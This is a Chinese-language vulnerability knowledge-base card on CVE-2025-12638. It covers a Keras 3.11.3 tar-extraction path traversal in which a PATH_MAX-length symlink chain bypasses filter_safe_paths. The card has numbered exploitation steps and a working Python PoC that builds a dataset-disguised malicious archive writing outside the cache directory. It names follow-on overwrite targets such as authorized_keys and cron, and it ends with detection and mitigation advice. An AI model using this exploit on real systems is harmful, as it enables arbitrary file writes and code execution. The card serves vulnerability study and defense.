---
id: web-generic-file-upload-keras-pathmax-symlink-chain-traversal
title: Keras get_file PATH_MAX 符号链接链绕过 filter_safe_paths：恶意 tar 解压写到缓存目录之外（CVE-2025-12638）
type: scenario
domain: web
path: web/generic/file-upload
technique: archive-pathmax-symlink-chain-filter-bypass
tags:
- web
- file-upload
- archive
- tar
- symlink
- path-traversal
- keras
- python
- path-max
cve:
- CVE-2025-12638
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: 3.11.3
verification:
  verified_by: verifier-V163
  verified_at: '2026-11-06T13:39:30+08:00'
  notes: 已对照原文与 7 张图核对：get_file→extract_archive→extractall(filter_safe_paths) 代码、16 层 247 字符目录+符号链接链、写 /exploit/keras_production_pwned.txt 的复现日志均一致；与 91189 卡机制不同（本卡为 PATH_MAX 超长链解析失败 fail-open，91189 为 filter 先 name 后 linkname 的顺序缺陷），两卡可并存；未在本机复跑
url: /docs/web/generic/file-upload/web-generic-file-upload-keras-pathmax-symlink-chain-traversal/
draft: false
kb_aliases:
- CVE-2025-12638
- Keras PATH_MAX 路径遍历
- Keras 符号链接链逃逸
- get_file tar 解压任意文件写入
- filter_safe_paths PATH_MAX 绕过
- tarfile.extractall filter=data 缺失
---

## 一句话结论

Keras 3.11.3 的 `keras.utils.get_file(..., extract=True)` 在解压 tar 时调用 `tarfile.extractall()` 却没有传 `filter='data'`；虽然它用 `filter_safe_paths()` 过滤条目，但过滤发生在解压前，攻击者可以构造一条由 16 层 247 字符目录 + 符号链接组成的超长链，使路径解析在 `PATH_MAX` 处失败，从而绕过过滤；随后 `extractall` 跟随符号链接，把文件写到缓存/解压目录之外（示例 `/exploit/keras_production_pwned.txt`），实现任意文件写入，进而可覆盖配置/脚本导致代码执行。

## 原理

- **入口**：`get_file()` 在 `extract=True` 时调用 `extract_archive(download_target, extraction_dir)`；tar 分支执行
  `archive.extractall(path, members=filter_safe_paths(archive))`。
  这里没有 `filter='data'`（Python 3.12+ 的内置安全过滤器），因此解压器不会对符号链接目标做内建校验。
- **过滤器先检查后解压**：`filter_safe_paths()` 只遍历 `TarInfo`，用 `resolve_path()`（`realpath(abspath(...))`）判断条目 name/linkname 是否位于基目录；真正创建文件/链接是后面的 `extractall`。检查与使用之间存在时间差，且解析发生在链接尚未创建时。
- **PATH_MAX 解析失败**：Linux 的 `PATH_MAX` 通常为 4096。攻击者在 tar 中构造 16 个长度为 247 的目录名 `d...d`，并在每一层放一个短名符号链接 `a/b/.../p -> d...d`，使解析后的路径长度接近/超过 4096；再在链尾放一个 254 字符的 `x...x` 目录/链接。过滤器对这些条目做 `realpath`/`lstat` 时因 `ENAMETOOLONG` 失败，错误处理没有把条目判为危险并阻断（fail-open），超长符号链接链被放行。
- **最终逃逸链接**：链尾再放一个符号链接，其 `linkname` 为 `"../" * 31`（相对路径向上 31 层）；解压器创建该链接后，后续条目的路径 `linkpath + target_dir + "/" + filename` 在解压时沿链接解析，落到缓存目录之外的目标目录。
- **写入成立**：恶意 tar 里同时放入一个普通文件条目，路径经过上述链接链；`extractall` 按顺序创建目录/链接/文件，最终在目标目录写入攻击者内容。示例写入 `/exploit/keras_production_pwned.txt`，服务端日志仍显示“数据集处理完成”，缓存目录看似正常。
- **为什么危险**：任意文件写入可覆盖应用配置、模板、启动脚本、`authorized_keys`、cron 等，进一步导致代码执行；在多租户 ML 平台中，普通用户上传数据集即可触发，属于跨租户/宿主边界突破。

## 触发条件

- 使用 Keras 3.11.3（受影响版本；原文明确标记）的 `get_file(..., extract=True)` 解压 tar，或复用同样的 `filter_safe_paths` + `extractall` 逻辑。
- 攻击者可控制被解压的 tar（用户上传数据集、可控下载 URL、被投毒的上游仓库等）。
- 运行在 Linux（`PATH_MAX` 限制明显；示例为 Kali），解压进程对目标目录有写权限。
- 未使用 `tarfile.extractall(..., filter='data')` 或等效的“拒绝符号链接/硬链接”策略；Python/环境未强制安全过滤器。
- 解压目录之外存在可被覆盖且会被执行/加载的路径（配置、脚本、服务文件等）。

## 利用步骤

1. 确认目标使用 Keras 3.11.3 且 `get_file(extract=True)` 解压用户可控 tar；观察上传/处理接口与缓存目录。
2. 构造恶意 tar：加入正常数据集文件伪装；创建 16 层、每层 247 字符的目录 `d...d`，并在每层创建短名符号链接指向该长目录，形成超长解析链。
3. 在链尾创建 254 字符的 `x...x` 路径与一个 `linkname="../"*31` 的符号链接，指向解压目录之外。
4. 追加普通文件条目，路径为“链尾路径 + 目标目录 + 文件名”，内容为攻击者要写入的数据。
5. 上传 tar 并触发处理（示例 `POST /api/process_dataset`），`get_file` 调用 `extractall`；过滤因 PATH_MAX 失败放行，文件被写到目标目录（示例 `/exploit/keras_production_pwned.txt`）。
6. 验证：在解压目录之外看到写入文件；随后按目标环境选择可执行路径（覆盖配置/脚本/服务）完成进一步利用。

## PoC

```python
import io, os, tarfile

def create_malicious_tgz(output_path, target_dir="/exploit"):
    comp_length = 247           # Linux 单层目录名长度
    comp = "d" * comp_length
    steps = "abcdefghijklmnop"  # 16 层符号链接
    path = ""

    with tarfile.open(output_path, mode="w:gz") as tar:
        # 正常数据集伪装
        data = b"# Dataset\nimage1.jpg,cat\n"
        f = tarfile.TarInfo("dataset/labels.csv")
        f.type = tarfile.REGTYPE; f.size = len(data)
        tar.addfile(f, fileobj=io.BytesIO(data))

        # 16 层：每层一个长目录 + 指向它的短名符号链接
        for step in steps:
            d = tarfile.TarInfo(os.path.join(path, comp))
            d.type = tarfile.DIRTYPE
            tar.addfile(d)

            link = tarfile.TarInfo(os.path.join(path, step))
            link.type = tarfile.SYMTYPE
            link.linkname = comp        # 相对指向同层长目录
            tar.addfile(link)

            path = os.path.join(path, comp)

        # 链尾超长名 + 向上逃逸 31 层的符号链接
        long_name = "x" * 254
        linkpath = os.path.join("/".join(steps), long_name)
        root_link = tarfile.TarInfo(linkpath)
        root_link.type = tarfile.SYMTYPE
        root_link.linkname = "../" * (len(steps) + 15)
        tar.addfile(root_link)

        # 经逃逸链接写入目标目录
        exploit_path = linkpath + target_dir + "/keras_production_pwned.txt"
        content = b"PRODUCTION ENVIRONMENT COMPROMISED!\n"
        ef = tarfile.TarInfo(exploit_path)
        ef.type = tarfile.REGTYPE; ef.size = len(content)
        tar.addfile(ef, fileobj=io.BytesIO(content))

create_malicious_tgz("malicious_dataset.tgz")
```

触发侧（示意）：

```python
from keras.utils import get_file
get_file(fname="dataset.tgz", origin="file:///path/to/malicious_dataset.tgz",
         cache_dir="cache", cache_subdir="user_datasets",
         extract=True, force_download=True)
# 结果：cache/user_datasets/... 之外出现 /exploit/keras_production_pwned.txt
```

原文在 Flask 多租户 ML 平台（Keras 3.11.3 + `get_file`）上复现：上传 `test.tgz` 后处理，服务端日志显示下载/解压完成，`/exploit/keras_production_pwned.txt` 被成功创建。

## 变体与关联

- **与本库既有 Keras 卡的差异**：[[web-generic-file-upload-keras-tar-filter-symlink-check-order-bypass]] 利用的是 `filter_safe_paths` 先检查 name、后检查 linkname 的顺序缺陷（`subdir/link_to_parent -> ..` 直接通过）；本卡利用的是超长符号链接链使 `realpath` 在 `PATH_MAX` 处失败并 fail-open，PoC 与触发条件明显不同。
- **链长变体**：调整目录名长度/层数，使解析长度刚好超过 `PATH_MAX`（4096）；Windows 上对应 `MAX_PATH` 260，链构造不同。
- **逃逸目标变体**：写入 `~/.ssh/authorized_keys`、cron、systemd、Web 根目录、Python site-packages、应用配置等，取决于进程权限与目标环境。
- **关联**：[[web-generic-file-upload-archive-symlink-extract-read-write]]（通用压缩包软链接读写）、[[web-generic-file-upload-node-tar-hardlink-linkpath-traversal]]（node-tar 硬链接路径逃逸）。
- **修复**：Keras 3.13.0 起改用 `filter_safe_tarinfos` 并优先检查符号链接，同时 Python 3.12–3.13 叠加 `filter="data"`；升级后本链失效。

## 检测与防御

- **使用安全过滤器**：Python 3.12+ 一律 `tarfile.extractall(path, filter="data")`；不要用自定义 `filter_safe_paths` 替代内建安全过滤器；3.14 起默认 `data`，但旧版本必须显式传。
- **拒绝链接条目**：解压前对 `issym()`/`islnk()` 一律拒绝，或校验 `linkname` 解析后的真实路径必须位于解压目录内（基于已存在目录做 `realpath`，并处理解析失败为 fail-closed）。
- **PATH_MAX 防护**：限制归档内单条路径长度/总深度；对 `ENAMETOOLONG` 等解析错误按“危险”处理并跳过，而不是放行。
- **隔离解压**：解压到临时目录/容器，目录不包含可被覆盖的敏感文件；解压后扫描指向目录外的符号链接并删除；以低权限用户运行。
- **检测**：归档中出现大量超长目录名/符号链接链；解压日志出现 `ENAMETOOLONG`/`realpath` 失败；缓存目录外出现新增文件；`get_file` 处理用户上传 tar 时出现异常路径。
- **升级**：Keras 升级到 3.13.0 及以上，并确认已启用 `filter_safe_tarinfos`/`filter='data'`。
